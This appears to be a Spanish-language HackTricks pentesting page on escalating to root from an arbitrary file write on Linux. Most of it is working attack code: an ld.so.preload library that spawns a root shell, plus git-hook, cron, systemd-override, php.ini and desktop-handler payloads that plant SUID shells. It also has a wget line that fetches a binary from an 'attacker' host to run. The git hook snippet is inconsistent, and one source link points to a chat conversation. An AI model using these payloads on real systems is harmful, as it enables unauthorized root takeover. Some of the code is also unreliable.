# Escritura arbitraria de archivos en root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este archivo se comporta como la variable de entorno **`LD_PRELOAD`** pero también funciona en **SUID binaries**.\
Si puedes crearlo o modificarlo, puedes simplemente añadir una **ruta a una librería que se cargará** con cada binario ejecutado.

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) son **scripts** que se **ejecutan** en varios **eventos** en un repositorio git como cuando se crea un commit, un merge... Así que si un **script o usuario privilegiado** está realizando estas acciones con frecuencia y es posible **escribir en la carpeta `.git`**, esto puede usarse para **privesc**.

Por ejemplo, es posible **generar un script** en un repositorio git en **`.git/hooks`** para que siempre se ejecute cuando se crea un nuevo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & archivos de tiempo

Si puedes **escribir archivos relacionados con cron que root ejecute**, normalmente puedes obtener ejecución de código la próxima vez que se ejecute la tarea. Objetivos interesantes incluyen:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- El propio crontab de root en `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- `systemd` timers y los servicios que activan

Comprobaciones rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Rutas típicas de abuso:

- **Append a new root cron job** a `/etc/crontab` o a un archivo en `/etc/cron.d/`
- **Replace a script** ya ejecutado por `run-parts`
- **Backdoor an existing timer target** modificando el script o el binary que lanza

Ejemplo mínimo de cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si solo puedes escribir dentro de un directorio cron usado por `run-parts`, coloca allí un archivo ejecutable:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` normalmente ignora nombres de archivo que contienen puntos, así que prefiera nombres como `backup` en lugar de `backup.sh`.
- Algunas distros usan `anacron` o timers de `systemd` en lugar del cron clásico, pero la idea de abuso es la misma: **modificar lo que root ejecutará más tarde**.

### Archivos de servicio y socket

Si puedes escribir **archivos de unidad de `systemd`** o archivos referenciados por ellos, podrías obtener ejecución de código como root recargando y reiniciando la unidad, o esperando a que se active la ruta de activación del servicio/socket.

Objetivos interesantes incluyen:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Comprobaciones rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Vías comunes de abuso:

- **Overwrite `ExecStart=`** en una unidad de servicio propiedad de root que puedas modificar
- **Add a drop-in override** con un `ExecStart=` malicioso y eliminar primero el anterior
- **Backdoor the script/binary** ya referenciado por la unidad
- **Hijack a socket-activated service** modificando el archivo `.service` correspondiente que se inicia cuando el socket recibe una conexión

Ejemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flujo típico de activación:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si no puedes reiniciar servicios tú mismo pero puedes editar una unidad activada por socket, puede que solo necesites **esperar a una conexión de cliente** para desencadenar la ejecución del servicio con backdoor como root.

### Sobrescribir un `php.ini` restrictivo usado por un sandbox PHP privilegiado

Algunos daemons personalizados validan PHP suministrado por usuarios ejecutando `php` con un **`php.ini` restrictivo** (por ejemplo, `disable_functions=exec,system,...`). Si el código en el sandbox todavía tiene **alguna primitiva de escritura** (como `file_put_contents`) y puedes acceder a la **ruta exacta de `php.ini`** usada por el daemon, puedes **sobrescribir esa configuración** para eliminar las restricciones y luego enviar un segundo payload que se ejecute con privilegios elevados.

Flujo típico:

1. El primer payload sobrescribe la configuración del sandbox.
2. El segundo payload ejecuta código ahora que las funciones peligrosas están habilitadas de nuevo.

Ejemplo mínimo (reemplaza la ruta usada por el daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

El archivo ubicado en `/proc/sys/fs/binfmt_misc` indica qué binario debe ejecutar qué tipo de archivos. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Un atacante con permisos de escritura en los directorios de configuración de la víctima puede reemplazar o crear archivos que cambien el comportamiento del sistema, resultando en la ejecución de código no deseada. Al modificar el archivo `$HOME/.config/mimeapps.list` para apuntar los manejadores de URL HTTP y HTTPS a un archivo malicioso (p. ej., estableciendo `x-scheme-handler/http=evil.desktop`), el atacante asegura que **clicking any http or https link triggers code specified in that `evil.desktop` file**. Por ejemplo, después de colocar el siguiente código malicioso en `evil.desktop` en `$HOME/.local/share/applications`, cualquier clic en una URL externa ejecuta el comando incrustado:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para más información consulta [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) donde se usó para explotar una vulnerabilidad real.

### Root ejecutando scripts/binarios escribibles por el usuario

Si un workflow privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binary dentro de un directorio propiedad de un usuario no privilegiado), puedes secuestrarlo:

- **Detect the execution:** monitorea procesos con [pspy](https://github.com/DominicBreuker/pspy) para detectar a root invocando rutas controladas por el usuario:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** asegúrate de que tanto el archivo objetivo como su directorio sean propiedad de tu usuario y sean escribibles.
- **Hijack the target:** haz una copia de seguridad del binary/script original y coloca un payload que cree una SUID shell (o cualquier otra acción root), luego restaura los permisos:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Activar la acción privilegiada** (p. ej., presionando un botón de la UI que lanza el helper). Cuando root vuelva a ejecutar el hijacked path, captura la escalated shell con `./rootshell -p`.

## Referencias

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
